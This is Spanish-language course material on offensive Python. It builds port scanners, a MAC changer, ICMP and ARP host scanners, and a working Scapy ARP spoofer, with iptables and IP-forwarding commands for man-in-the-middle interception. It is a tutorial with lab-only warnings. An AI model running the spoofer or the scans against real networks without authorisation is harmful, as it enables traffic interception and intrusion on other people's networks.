---
aliases: [Hacking Ofensivo, Desarrollo de Herramientas Ofensivas]
tags: [hacking/explotacion, hacking/reconocimiento, programacion/python]
estado: 🟢 Terminado
---
# Python Ofensivo

Una parte significativa de esta sección se dedicará al uso de **Scapy**, una poderosa biblioteca de Python diseñada para la manipulación y control de paquetes de red. A través de Scapy, aprenderemos cómo inspeccionar, modificar e incluso crear paquetes de red, lo que nos permitirá entender mejor cómo fluye la información a través de Internet y cómo pueden ser explotadas las vulnerabilidades en los protocolos de red.

> [!info]
> **Scapy** es una biblioteca de manipulación de paquetes interactiva y potente. Permite a los usuarios crear, enviar, capturar y analizar paquetes de red. Es extremadamente flexible y puede manejar una amplia gama de protocolos, lo que la convierte en una herramienta indispensable para pruebas de penetración, ingeniería inversa de protocolos y desarrollo de herramientas de red personalizadas.

Además, exploraremos el uso de **NetfilterQueue**, una herramienta que nos permitirá interceptar y manipular paquetes de red en un sistema Linux, trabajando en conjunto con **iptables** para aplicar reglas de filtrado y redirección de tráfico. Esta combinación de herramientas nos ofrecerá una comprensión práctica de cómo los ataques pueden ser dirigidos y cómo podemos defender nuestras redes contra ellos.

> [!info]
> **NetfilterQueue** es un módulo de Python que permite interactuar con las colas de Netfilter (NFQUEUE) del kernel de Linux. NFQUEUE es un mecanismo que permite a los programas en espacio de usuario interceptar paquetes de red que coinciden con ciertas reglas de `iptables`, procesarlos y luego decidir si los aceptan, los descartan o los modifican antes de reinyectarlos en el flujo de la red. Es fundamental para la implementación de firewalls avanzados, IDS/IPS y herramientas de manipulación de tráfico.

Otro componente clave de esta sección del curso será **Mitmproxy**, un proxy de interceptación que nos permitirá observar, modificar y jugar con el tráfico HTTP/HTTPS. A través de Mitmproxy, entenderemos mejor los ataques de 'man-in-the-middle' (**MitM**), una técnica comúnmente utilizada por los atacantes para interceptar y alterar la comunicación entre dos partes sin que ellas lo sepan.

> [!info]
> **Mitmproxy** es un proxy HTTP/HTTPS interactivo y programable. Permite a los desarrolladores y pentesters interceptar, inspeccionar, modificar y reproducir tráfico web. Su capacidad para manejar HTTPS mediante la generación dinámica de certificados SSL/TLS lo hace invaluable para analizar aplicaciones web seguras y realizar ataques MitM controlados en entornos de laboratorio.

Al final de esta sección, tendréis una comprensión detallada no solo de cómo se emplean las herramientas de hacking, sino también de cómo crear vuestras propias herramientas personalizadas. Estaréis equipados con los conocimientos necesarios para diseñar y desarrollar herramientas de hacking orientadas específicamente al descubrimiento y explotación de vulnerabilidades en sistemas y redes.

Este enfoque práctico y centrado en la creación os permitirá entender profundamente los mecanismos detrás de los ataques cibernéticos y cómo las vulnerabilidades pueden ser identificadas y explotadas. Este conocimiento es esencial para cualquier profesional de la seguridad informática que busca proteger eficazmente sus sistemas y redes contra atacantes maliciosos, proporcionando una base sólida para el desarrollo de estrategias de defensa más avanzadas y personalizadas.

# Creando un Escáner de Puertos

Durante el desarrollo de estas clases, nos centraremos en la creación de un escáner de puertos. Una característica clave será la implementación de '**threading**' para acelerar el proceso de escaneo. Aprenderemos a utilizar '**ThreadPoolExecutor**' para gestionar y limitar los hilos, evitando así errores comunes como el exceso de conexiones máximas.

Además, integraremos '**argparse**' en nuestra herramienta, lo que nos permitirá personalizar las opciones de ejecución. Este enfoque nos dará una comprensión más profunda de cómo optimizar el rendimiento y la eficiencia de nuestras herramientas de seguridad en red, manteniendo un equilibrio entre velocidad y estabilidad.

> [!tip]
> Un escáner de puertos es una herramienta fundamental en el reconocimiento de red. Permite identificar qué servicios están escuchando en puertos específicos de un host objetivo, revelando posibles vectores de ataque o información sobre la configuración del sistema. La eficiencia es clave, por lo que el uso de `threading` o `asyncio` es crucial para escanear múltiples puertos concurrentemente.

V1:
```python
#!/usr/bin/env python3

import socket

host = "192.168.1.254"
port = 80

def port_scanner(port):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Iniciamos la variable socket. AF_INET especifica la familia de direcciones IPv4, y SOCK_STREAM indica un socket TCP.
    s.settimeout(0.2) # Con esto podemos definir un tiempo de espera máximo para las operaciones del socket.

    # Recordemos que 0 es igual a False y 1 es igual a True en booleano.
    if not s.connect_ex((host, port)): # connect_ex intenta establecer una conexión remota. Devuelve 0 si la conexión es exitosa (puerto abierto) o un código de error (ej. 111 Connection refused) si falla (puerto cerrado o filtrado).
        print(f"\n[+] El puerto {port} está Abierto")

    else:
        print(f"\n[+] El puerto {port} está Cerrado")

    s.close()

def main():

    port_scanner(port)

if __name__ == "__main__":
    main()

```

V2:
```python
#!/usr/bin/env python3

import socket

host = input(f"Introduce la dirección IP: ")
port = int(input("Introduce el puerto a escanear: "))

def port_scanner(port):

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Iniciamos la variable socket. AF_INET especifica la familia de direcciones IPv4, y SOCK_STREAM indica un socket TCP.
    s.settimeout(0.2) # Con esto podemos definir un tiempo de espera máximo para las operaciones del socket.

    # Recordemos que 0 es igual a False y 1 es igual a True en booleano.
    if not s.connect_ex((host, port)): # connect_ex intenta establecer una conexión remota. Devuelve 0 si la conexión es exitosa (puerto abierto) o un código de error (ej. 111 Connection refused) si falla (puerto cerrado o filtrado).
        print(f"\n[+] El puerto {port} está Abierto")

    else:
        print(f"\n[+] El puerto {port} está Cerrado")

    s.close()

def main():

    port_scanner(port)

if __name__ == "__main__":
    main()

```

V3:
```python
#!/usr/bin/env python3

import socket
from termcolor import colored

host = input(f"Introduce la dirección IP: ")

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Iniciamos la variable socket. AF_INET especifica la familia de direcciones IPv4, y SOCK_STREAM indica un socket TCP.
    s.settimeout(0.2) # Con esto podemos definir un tiempo de espera máximo para las operaciones del socket.
    return s

def port_scanner(s, port):

    try:
        s.connect((host,port))
        print(colored(f"[+] El puerto {port} está Abierto", 'green')) # Con ayuda de colored podemos poner colores a nuestros outputs.
        s.close() # Cerramos el socket.

    except (socket.timeout, ConnectionRefusedError): # socket.timeout se lanza si el tiempo de espera se agota. ConnectionRefusedError se lanza si la conexión es rechazada activamente por el host remoto.
        s.close() # Cerramos el socket.

def main():
    
    for port in range(1, 1000):
        s = create_socket() # Creamos el socket.
        port_scanner(s, port)

if __name__ == "__main__":
    main()
```

V4:
```python
#!/usr/bin/env python3

import socket
import argparse # Nos ayuda a crear un menú de argumentos de línea de comandos.
from termcolor import colored
import sys

def get_arguments():
    parser = argparse.ArgumentParser(description='Fast TCP Port Scanner') # Iniciamos la clase ArgumentParser y le damos una descripción.
    parser.add_argument("-t", "--target", dest="target", help="Victim target to scan (Ex: -t 192.168.0.1)") # Con .add_argument podemos crear flags como -t o --target y almacenar lo que se ponga en la variable 'target' descrita en dest. La variable no es necesario declararla previamente.
    parser.add_argument("-p", "--ports", dest="port", help="Ports range to scan (Ex: -p 1-100)" )
    
    options = parser.parse_args() # Nos permite instanciar un objeto en el cual encontraremos un método con el nombre del parámetro que definimos, en este caso 'target'.

    if options.target is None or options.port is None:
        parser.print_help()
        sys.exit(1)

    return options.target, options.port

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Iniciamos la variable socket. AF_INET especifica la familia de direcciones IPv4, y SOCK_STREAM indica un socket TCP.
    s.settimeout(0.2) # Con esto podemos definir un tiempo de espera máximo para las operaciones del socket.
    return s

def port_scanner(s, port, host):

    try:
        s.connect((host,port))
        print(colored(f"[+] El puerto {port} está Abierto", 'green')) # Con ayuda de colored podemos poner colores a nuestros outputs.
        s.close() # Cerramos el socket.

    except (socket.timeout, ConnectionRefusedError): # socket.timeout se lanza si el tiempo de espera se agota. ConnectionRefusedError se lanza si la conexión es rechazada activamente por el host remoto.
        s.close() # Cerramos el socket.

def main():

    target,ports= get_arguments()

    if '-' in ports:
        ports = ports.split('-')

    for port in range(int(ports[0]), int(ports[1])):
        s = create_socket() # Creamos el socket.
        port_scanner(s, port, target)

if __name__ == "__main__":
    main()
```

V5, optimización del código:
```python
#!/usr/bin/env python3

import socket
import argparse # Nos ayuda a crear un menú de argumentos de línea de comandos.
from termcolor import colored
import sys

def get_arguments():
    parser = argparse.ArgumentParser(description='Fast TCP Port Scanner') # Iniciamos la clase ArgumentParser y le damos una descripción.
    parser.add_argument("-t", "--target", dest="target", required=True, help="Victim target to scan (Ex: -t 192.168.0.1)") # Con .add_argument podemos crear flags como -t o --target y almacenar lo que se ponga en la variable 'target' descrita en dest. Usamos 'required=True' para indicar que este argumento es obligatorio.
    parser.add_argument("-p", "--ports", dest="port", required=True,help="Ports range to scan (Ex: -p 1-100)" ) # Usamos 'required=True' para indicar que este argumento es obligatorio.
    options = parser.parse_args() # Nos permite instanciar un objeto en el cual encontraremos un método con el nombre del parámetro que definimos, en este caso 'target'.

    return options.target, options.port 

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Iniciamos la variable socket. AF_INET especifica la familia de direcciones IPv4, y SOCK_STREAM indica un socket TCP.
    s.settimeout(0.2) # Con esto podemos definir un tiempo de espera máximo para las operaciones del socket.
    return s

def port_scanner(s, port, host):

    try:
        s.connect((host,port)) # Generamos la conexión.
        print(colored(f"[+] El puerto {port} está Abierto", 'green')) # Con ayuda de colored podemos poner colores a nuestros outputs.
        s.close() # Cerramos el socket.

    except (socket.timeout, ConnectionRefusedError): # socket.timeout se lanza si el tiempo de espera se agota. ConnectionRefusedError se lanza si la conexión es rechazada activamente por el host remoto.
        s.close() # Cerramos el socket.

def parse_ports(ports_str):
    if '-' in ports_str:
        start, end = map(int, ports_str.split('-')) # Recordemos que con map podemos aplicar una función (int) a cada elemento de un iterable.
        return range(start, end+1) # Devolvemos end+1 porque recordemos que con range el límite superior es exclusivo (desde n hasta n-1).

    elif ',' in ports_str:
        return map(int, ports_str.split(',')) # Retornamos directamente map ya que es un iterable.

    else:
        return (int(ports_str),) # Generamos una tupla de un único elemento para manejar un solo puerto.

def scan_ports(ports, target):

    for port in ports:
        s = create_socket() # Generamos un socket.
        port_scanner(s, port, target)

def main():

    target,ports_str= get_arguments()
    ports = parse_ports(ports_str)
    scan_ports(ports, target)

if __name__ == "__main__":
    main()
```

V6 Usando Hilos para mejorar la velocidad:
```python
#!/usr/bin/env python3

import socket
import argparse # Nos ayuda a crear un menú de argumentos de línea de comandos.
from termcolor import colored
import threading # Módulo para trabajar con hilos (threads) y ejecutar tareas concurrentemente.

def get_arguments():
    parser = argparse.ArgumentParser(description='Fast TCP Port Scanner') # Iniciamos la clase ArgumentParser y le damos una descripción.
    parser.add_argument("-t", "--target", dest="target", required=True, help="Victim target to scan (Ex: -t 192.168.0.1)") # Con .add_argument podemos crear flags como -t o --target y almacenar lo que se ponga en la variable 'target' descrita en dest. Usamos 'required=True' para indicar que este argumento es obligatorio.
    parser.add_argument("-p", "--ports", dest="port", required=True,help="Ports range to scan (Ex: -p 1-100)" ) # Usamos 'required=True' para indicar que este argumento es obligatorio.
    options = parser.parse_args() # Nos permite instanciar un objeto en el cual encontraremos un método con el nombre del parámetro que definimos, en este caso 'target'.

    return options.target, options.port 

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Iniciamos la variable socket. AF_INET especifica la familia de direcciones IPv4, y SOCK_STREAM indica un socket TCP.
    s.settimeout(0.2) # Con esto podemos definir un tiempo de espera máximo para las operaciones del socket.
    return s

def port_scanner(port, host):

    s = create_socket() # Generamos un socket.

    try:
        s.connect((host,port)) # Generamos la conexión.
        print(colored(f"[+] El puerto {port} está Abierto", 'green')) # Con ayuda de colored podemos poner colores a nuestros outputs.
        s.close() # Cerramos el socket.

    except (socket.timeout, ConnectionRefusedError): # socket.timeout se lanza si el tiempo de espera se agota. ConnectionRefusedError se lanza si la conexión es rechazada activamente por el host remoto.
        s.close() # Cerramos el socket.

def parse_ports(ports_str):
    if '-' in ports_str:
        start, end = map(int, ports_str.split('-')) # Recordemos que con map podemos aplicar una función (int) a cada elemento de un iterable.
        return range(start, end+1) # Devolvemos end+1 porque recordemos que con range el límite superior es exclusivo (desde n hasta n-1).

    elif ',' in ports_str:
        return map(int, ports_str.split(',')) # Retornamos directamente map ya que es un iterable.

    else:
        return (int(ports_str),) # Generamos una tupla de un único elemento para manejar un solo puerto.

def scan_ports(ports, target):

    threads = [] # Creamos una lista para almacenar los hilos.

    for port in ports:
        thread = threading.Thread(target=port_scanner, args=(port, target)) # Creamos y configuramos el hilo, especificando la función a ejecutar (target) y sus argumentos (args).
        threads.append(thread) # Almacenamos los hilos en nuestra lista.
        thread.start() # Iniciamos los hilos.

    for thread in threads:
        thread.join() # Cerramos los hilos una vez que estos terminen su ejecución, usando la lista que definimos.

def main():

    target,ports_str= get_arguments()
    ports = parse_ports(ports_str)
    scan_ports(ports, target)

if __name__ == "__main__":
    main()
```

V7 implementando ThreadPoolExecutor para enviar hilos por tandadas e implementando un manejador de señales:
```python
#!/usr/bin/env python3

import sys
import signal # Módulo que nos ayuda a manejar las señales del sistema, como las generadas por teclado (ej. CTRL+C).
import socket
import argparse # Nos ayuda a crear un menú de argumentos de línea de comandos.
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor # Permite ejecutar llamadas de forma asíncrona utilizando un pool de hilos.

open_sockets = [] # Lista la cual nos ayuda a almacenar sockets abiertos para poder cerrarlos limpiamente.

def def_handler(sig, frame): # Cuando recibimos una señal, esta devuelve dos valores: 'sig' que es un identificador de señal y 'frame' que es el punto en donde se encontraba la ejecución del programa.

    print(colored(f"\n[!] Saliendo del programa.....", 'red'))

    for s in open_sockets: # Como la salida va a ser forzada, tenemos que usar los sockets que almacenamos para cerrarlos.
        s.close() # Cerramos los sockets que estamos usando.

    sys.exit(1) # Realizamos un exit con estado 1, indicando una salida anormal.

signal.signal(signal.SIGINT, def_handler) # Cuando se presione CTRL+C (SIGINT), se llamará a la función def_handler.

def get_arguments():
    parser = argparse.ArgumentParser(description='Fast TCP Port Scanner') # Iniciamos la clase ArgumentParser y le damos una descripción.
    parser.add_argument("-t", "--target", dest="target", required=True, help="Victim target to scan (Ex: -t 192.168.0.1)") # Con .add_argument podemos crear flags como -t o --target y almacenar lo que se ponga en la variable 'target' descrita en dest. Usamos 'required=True' para indicar que este argumento es obligatorio.
    parser.add_argument("-p", "--ports", dest="port", required=True,help="Ports range to scan (Ex: -p 1-100)" ) # Usamos 'required=True' para indicar que este argumento es obligatorio.
    options = parser.parse_args() # Nos permite instanciar un objeto en el cual encontraremos un método con el nombre del parámetro que definimos, en este caso 'target'.

    return options.target, options.port 

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Iniciamos la variable socket. AF_INET especifica la familia de direcciones IPv4, y SOCK_STREAM indica un socket TCP.
    s.settimeout(0.2) # Con esto podemos definir un tiempo de espera máximo para las operaciones del socket.

    open_sockets.append(s) # Agregamos el socket que creamos a nuestra lista de open_sockets para una gestión adecuada.

    return s

def port_scanner(port, host):

    s = create_socket() # Generamos un socket.

    try:
        s.connect((host,port)) # Generamos la conexión.
        s.sendall(b"HEAD / HTTP/1.1\r\n\r\n") # Enviamos una solicitud HTTP HEAD para intentar obtener información del servicio sin descargar el cuerpo de la respuesta.
        response = s.recv(1024).decode(errors='ignore').split("\n") # Recibimos hasta 1024 bytes de la respuesta, la decodificamos (ignorando errores) y la dividimos por líneas.

        if response:
            print(colored(f"[+] El puerto {port} está Abierto\n", "green"))

            for line in response:
                print(colored(f"{line}", 'grey'))

        else:
            print(colored(f"[+] El puerto {port} está Abierto", 'green')) # Con ayuda de colored podemos poner colores a nuestros outputs.

    except (socket.timeout, ConnectionRefusedError): # socket.timeout se lanza si el tiempo de espera se agota. ConnectionRefusedError se lanza si la conexión es rechazada activamente por el host remoto.
        pass # Ignoramos los errores para continuar con el escaneo.
    finally:
        s.close() # Aseguramos que el socket se cierre en cualquier caso.

def parse_ports(ports_str):
    if '-' in ports_str:
        start, end = map(int, ports_str.split('-')) # Recordemos que con map podemos aplicar una función (int) a cada elemento de un iterable.
        return range(start, end+1) # Devolvemos end+1 porque recordemos que con range el límite superior es exclusivo (desde n hasta n-1).

    elif ',' in ports_str:
        return map(int, ports_str.split(',')) # Retornamos directamente map ya que es un iterable.

    else:
        return (int(ports_str),) # Generamos una tupla de un único elemento para manejar un solo puerto.

def scan_ports(ports, target):

    with ThreadPoolExecutor(max_workers=250) as executor: # Con ayuda de 'with' podemos implementar ThreadPoolExecutor y pasarle el máximo de hilos en paralelo con 'max_workers'.
        executor.map(lambda port: port_scanner(port, target), ports) # 'executor.map' nos permite iterar sobre un iterable y pasarle uno por uno los valores a la función. Como solo permite pasar un valor directamente, usamos una función lambda para encapsular la llamada a 'port_scanner' con sus múltiples argumentos.

def main():

    target,ports_str= get_arguments()
    ports = parse_ports(ports_str)
    scan_ports(ports, target)

if __name__ == "__main__":
    main()
```

# Creando un programa que nos cambie la dirección MAC

En esta clase, te guiaremos a través del proceso de creación de una herramienta en Python que te permitirá cambiar la dirección MAC de una interfaz de red. Aprenderás a programar desde cero esta funcionalidad, explorando conceptos clave y técnicas de programación que te serán útiles no solo para este proyecto, sino también en otros aspectos de la ciberseguridad.

Esta herramienta personalizada te dará un mayor entendimiento de cómo las direcciones MAC funcionan y cómo se pueden manipular para diversos propósitos en el mundo de la seguridad informática.

> [!warning]
> Cambiar la dirección MAC de una interfaz de red puede tener implicaciones legales y éticas si se realiza sin autorización. En entornos de laboratorio controlados, es una técnica útil para evadir filtros de red basados en MAC, suplantar identidades o realizar pruebas de seguridad. Sin embargo, su uso indebido puede ser ilegal y perjudicial.

```python
#!/usr/bin/env python3

import argparse # Nos ayuda a crear un panel para la ejecución del programa.
import re # Esto nos ayuda con el uso de expresiones regulares.
import subprocess # Para la ejecución de comandos controlada.
from termcolor import colored # Jugamos con colores.
import signal # Para la detección de comandos por teclado.
import sys # Para la ejecución de comandos.

def def_handler(sig, frame):

    print(colored(f"\n[!] Cerrando el programa.....\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # Controlamos la salida con CTRL+C.

def get_arguments():

    parser = argparse.ArgumentParser(description="Change Mac on interface wireless") # Creamos una instancia para el panel y le pasamos una descripción.
    parser.add_argument("-i", "--interface", required=True, dest="interface", help="Nombre de la interfaz de red") # Agregamos un parámetro obligatorio para la interfaz.
    parser.add_argument("-m", "--mac", required=True, dest="mac_addres", help="Nueva dirección MAC para la interfaz de red") # Agregamos otro parámetro obligatorio para la dirección MAC.

    return parser.parse_args() # Retornamos el objeto que contiene los argumentos como métodos.

def is_valid_input(interface, mac_addres):

    is_valid_interface = re.match(r"^[a-z][a-z][a-z]\d{1,2}$", interface) # Para validar el formato de la interfaz, creamos una expresión regular y la verificamos con match. \d es para dígitos y {1,2} para uno o dos dígitos (ej. eth0, wlan1).
    is_valid_mac_addres = re.match(r'^([0-9A-Fa-f]{2}[:]){5}[0-9A-Fa-f]{2}$', mac_addres) # La expresión regular valida el formato estándar de una dirección MAC (ej. AA:BB:CC:DD:EE:FF). [0-9A-Fa-f]{2} coincide con dos caracteres hexadecimales, y ([:]){5} asegura cinco separadores de dos puntos.

    return is_valid_interface and is_valid_mac_addres # Retornamos True si ambos formatos son válidos (no son None).

def change_mac(interface, mac_addres):

    if is_valid_input(interface, mac_addres):

        # Ejecutamos los comandos con subprocess para evitar inyección de comandos y asegurar una ejecución segura.
        # Primero, bajamos la interfaz de red.
        subprocess.run(["ifconfig", interface, "down"])
        # Luego, cambiamos la dirección MAC.
        subprocess.run(["ifconfig", interface, "hw", "ether", mac_addres])
        # Finalmente, subimos la interfaz de red.
        subprocess.run(["ifconfig", interface, "up"])

        print(colored(f"\n[+] La MAC ha sido cambiada exitosamente a {mac_addres} en la interfaz {interface}\n", 'green'))

    else:
        print(colored(f"\n[!] Los datos de entrada (interfaz o MAC) son incorrectos o no cumplen el formato esperado.\n", 'red'))

def main():
    args = get_arguments() # Recibimos el objeto que contiene los parámetros.

    change_mac(args.interface, args.mac_addres) # Enviamos el contenido de los parámetros mediante sus métodos.

if __name__ == "__main__":
    main()
```

# Creando Escáner de Red

## ICMP

En esta clase, abordaremos el desarrollo de un escáner de red utilizando el protocolo ICMP, todo ello a través de Python. Te enseñaremos cómo programar un escáner eficiente y confiable que pueda detectar dispositivos activos en una red. Cubriremos los fundamentos del protocolo ICMP y cómo se utiliza en el escaneo de redes, proporcionando conocimientos prácticos y teóricos.

Al final de esta clase, tendrás una herramienta poderosa en tu arsenal de ciberseguridad, la cual te permitirá realizar diagnósticos de red y entender mejor la estructura de las redes a las que te enfrentes.

> [!info]
> El protocolo **ICMP (Internet Control Message Protocol)** es utilizado principalmente para enviar mensajes de error y otra información operativa sobre el procesamiento de datagramas IP. En el escaneo de red, los mensajes ICMP Echo Request (ping) son fundamentales para determinar si un host está activo y responde en la red. Un escáner ICMP es una herramienta básica pero efectiva para el descubrimiento de hosts.

```python
#!/usr/bin/env python3

import argparse
import re
import subprocess
import signal
import sys
from termcolor import colored
from concurrent.futures import ThreadPoolExecutor

def def_handler(sig, frame): 
    print(colored(f"[!] Saliendo......", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler) # Controlamos la salida con CTRL + C.

def get_arguments():

    parser = argparse.ArgumentParser(description="Herramienta para descubrir hosts activos en una red") # Instanciamos una clase y definimos su descripción.
    parser.add_argument("-t", "--target", required=True, dest="target", help="Host o rango de red a escanear (ej. 192.168.1.1 o 192.168.1.0/24)") # Agregamos un argumento obligatorio.

    args = parser.parse_args() # Definimos un objeto pasándole todos los argumentos.

    return args.target

def validation_format(target_str):

    if "/" in target_str:
        # Expresión regular para validar formato IP/CIDR (ej. 192.168.1.0/24)
        valid_input = re.match(r"^(\d{1,3}\.){3}\d{1,3}\/\d{1,2}$", target_str) # Corregido para CIDR de 1 a 2 dígitos.
        return valid_input
    else:
        # Expresión regular para validar formato IP simple (ej. 192.168.1.1)
        valid_input = re.match(r"^(\d{1,3}\.){3}\d{1,3}$", target_str)
        return valid_input

def parse_target(target_str):

    if validation_format(target_str):

        if "/" in target_str:
            # Manejo de rango CIDR (ej. 192.168.1.0/24)
            ip_base, cidr = target_str.split('/')
            ip_parts = ip_base.split('.')
            network_prefix = '.'.join(ip_parts[:3]) + "."
            
            # Calcular el rango de IPs para el CIDR (simplificado para /24 o similar)
            # Para un /24, el rango va de .0 a .255. Aquí se asume un rango simple para el último octeto.
            # Una implementación completa de CIDR requeriría cálculo de máscara de subred.
            if int(cidr) == 24: # Ejemplo simplificado para /24
                return [f"{network_prefix}{i}" for i in range(1, 255)] # Excluyendo .0 y .255 que suelen ser red y broadcast.
            else:
                # Implementación más compleja para otros CIDR o usar librerías como ipaddress
                print(colored(f"\n[!] El cálculo de rango para CIDR distinto de /24 no está implementado en este ejemplo.\n", 'yellow'))
                sys.exit(1)

        else:
            # Manejo de IP única
            return [target_str]

    else:
        print(colored(f"\n[!] El formato del objetivo no es válido. Use IP (ej. 192.168.1.1) o IP/CIDR (ej. 192.168.1.0/24).\n", 'red'))
        sys.exit(1)

def host_discovery(target):

    try:
        # Ejecutamos el comando ping con un solo paquete (-c 1), un timeout de 1 segundo y redirigimos la salida estándar a DEVNULL para que no se muestre en consola.
        ping = subprocess.run(["ping", "-c", "1", target], timeout=1, stdout=subprocess.DEVNULL)
        if ping.returncode == 0: # Si el código de retorno es 0, el ping fue exitoso, lo que indica que el host está activo.
            print(colored(f"El Host: {target} - Activo", 'green'))

    except subprocess.TimeoutExpired:
            pass # Si el ping excede el timeout, simplemente pasamos sin imprimir nada, asumiendo que el host no respondió.

def main():

    target_str = get_arguments()
    targets = parse_target(target_str)

    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(host_discovery, targets)

if __name__ == "__main__":
    main()
```

## ARP

En esta clase, nos enfocaremos en la creación de un escáner de red basado en el protocolo ARP, utilizando la poderosa biblioteca de Python, **Scapy**.

**Scapy** es una herramienta increíblemente versátil para la manipulación y análisis de paquetes en redes, y es fundamental en el campo de la ciberseguridad. Aprenderás cómo utilizar Scapy para construir un escáner ARP desde cero, lo que te permitirá identificar dispositivos en una red local. Este escáner será una herramienta esencial para entender cómo los dispositivos se comunican en una red.

Al finalizar la clase, tendrás un conocimiento práctico de Scapy y del protocolo ARP, así como una herramienta útil para el análisis de redes.

> [!info]
> El **Protocolo de Resolución de Direcciones (ARP)** es un protocolo de comunicación de la capa de enlace de datos utilizado para encontrar la dirección de hardware (MAC) de un host a partir de su dirección IP. Un escáner ARP envía solicitudes ARP a todas las direcciones IP en un segmento de red local y escucha las respuestas, lo que permite mapear direcciones IP a direcciones MAC de los dispositivos activos en la red.

```python
#!/usr/bin/env python3

import scapy.all as scapy # Importamos Scapy. Los métodos que usamos solo son válidos ejecutando el script con privilegios de root.
import argparse

def get_arguments():

    parser = argparse.ArgumentParser(description="Host Scan ARP")
    parser.add_argument("-t", "--target", required=True, dest="target", help="Host / IP range to Scan (ej. 192.168.1.1/24)")

    args = parser.parse_args()

    return args.target

def scan(ip):
    # Construyendo un paquete ARP válido de red.
    arp_packet = scapy.ARP(pdst=ip) # Construimos la trama ARP. 'pdst' especifica la dirección IP de destino.
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # Construimos la trama Ethernet con la dirección MAC de broadcast.

    arp_packet = broadcast_packet/arp_packet # No estamos dividiendo, sino componiendo o uniendo las dos capas (Ethernet sobre ARP) para formar el paquete completo.
    answered, unanswered = scapy.srp(arp_packet, verbose=False, timeout=1) # 'srp' (send and receive packets) nos permite enviar un paquete a la red y devuelve dos listas: los que responden y los que no. 'verbose=False' suprime la salida detallada de Scapy, y 'timeout=1' establece un tiempo de espera de 1 segundo.
    
    response = answered.summary() # A través de 'summary()' logramos obtener un resumen de todas las respuestas cuando enviamos los paquetes.

    if response:
        print(response)

def main():

    target = get_arguments()
    scan(target)

if __name__ == "__main__":
    main()
```

## **Creando un envenenador ARP (ARP Spoofer) con Scapy**

En esta clase, nos centraremos en la creación de un envenenador ARP (**ARP Spoofer**) utilizando Scapy, una herramienta esencial de Python para el análisis y manipulación de paquetes de red. El ARP Spoofing es una técnica de ataque en redes donde un atacante envía mensajes ARP falsificados en una red local. Esto se hace para asociar la dirección MAC del atacante con la dirección IP de otro dispositivo, como un servidor o un gateway, lo que permite al atacante interceptar el tráfico entre dos sistemas.

El concepto de **Man-In-The-Middle** (**MITM**) es crucial aquí, ya que el atacante se posiciona estratégicamente entre dos partes para interceptar o modificar el tráfico de datos, una táctica común en ataques cibernéticos. Esta técnica es posible debido a la naturaleza de confianza del protocolo ARP, que no verifica si las respuestas a las solicitudes ARP son legítimas.

Durante la clase, exploraremos cómo Scapy puede ser utilizado para implementar este tipo de ataque, proporcionando una comprensión profunda de cómo funciona el ARP Spoofing y por qué es una amenaza significativa en las redes. Esta experiencia práctica te dotará de las habilidades necesarias para identificar y prevenir estos ataques en entornos reales, fortaleciendo tu comprensión y habilidades en ciberseguridad.

> [!warning]
> El ARP Spoofing es una técnica de ataque activa que puede interrumpir la comunicación de red y es ilegal si se realiza sin autorización. Su uso debe limitarse estrictamente a entornos de laboratorio controlados y con fines educativos. Asegúrate de restaurar la tabla ARP de las víctimas después de la prueba para evitar problemas de conectividad.

Primero tenemos que ejecutar el comando el cual nos permitirá redirigir las peticiones:

```bash
iptables --policy FORWARD ACCEPT
```

Lo siguiente es modificar el archivo: /proc/sys/net/ipv4/ip_forward, y cambiar el contenido el cual debe ser un 0 por un 1.

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

Ya con esto podemos comenzar:

```python
#!/usr/bin/env python3

import argparse
import time
import scapy.all as scapy

def get_arguments():

    parser = argparse.ArgumentParser(description="Arp Spoofer")
    parser.add_argument("-t", "--target", required=True, dest="victim", help="Host / IP de la víctima a envenenar") 
    parser.add_argument("-r", "--router", required=True, dest="router", help="Host / IP del router (gateway) a suplantar")

    return parser.parse_args()

def spoof(ip_addres, router):

    # Creamos un paquete ARP de respuesta (op=2).
    # 'psrc' (protocol source) es la IP del router que estamos suplantando.
    # 'pdst' (protocol destination) es la IP de la víctima.
    # 'hwsrc' (hardware source) es la dirección MAC del atacante (nuestra MAC).
    arp_packet = scapy.ARP(op=2, psrc=router, pdst=ip_addres, hwsrc="aa:bb:cc:44:55:66") 
    scapy.send(arp_packet, verbose=False) # Solo enviamos el paquete, 'verbose=False' para no mostrar la salida de Scapy.

def main():
    
    arguments = get_arguments()
    while True:
        spoof(arguments.victim, arguments.router) # Este es para la máquina víctima, para que crea que somos el router.
        spoof(arguments.router, arguments.victim) # Este es para el router, para que crea que somos la máquina víctima.

        time.sleep(2) # Esperamos 2 segundos antes de enviar el siguiente par de paquetes ARP para mantener el envenenamiento.

if __name__ == "__main__":
    main()
```

## **Creando un rastreador de consultas DNS (DNS Sniffer) con Scapy**

En esta clase, nos centraremos en la creación de un rastreador de consultas DNS (DNS Sniffer) utilizando Scapy, una herramienta de Python orientada a la manipulación de paquetes de red para propósitos ofensivos. Un DNS Sniffer es una herramienta ofensiva que permite interceptar y analizar las consultas DNS en una red. Estas consultas son esenciales en la comunicación de Internet, ya que convierten nombres de dominio en direcciones IP.

Con Scapy, aprenderás a capturar paquetes DNS de forma activa para explorar cómo los dispositivos en una red interactúan con servidores DNS. Este conocimiento es crucial en el contexto ofensivo, ya que permite identificar objetivos potenciales para ataques y explotar vulnerabilidades en la comunicación DNS.

Durante la clase, te mostraremos cómo se pueden utilizar estas técnicas para reunir información valiosa sobre una red y sus usuarios, lo que puede ser utilizado en diversas estrategias de ataque. Al final de esta sesión, habrás desarrollado una herramienta ofensiva clave que te permitirá realizar reconocimientos avanzados y explotar debilidades en la gestión de DNS dentro de una red.

> [!info]
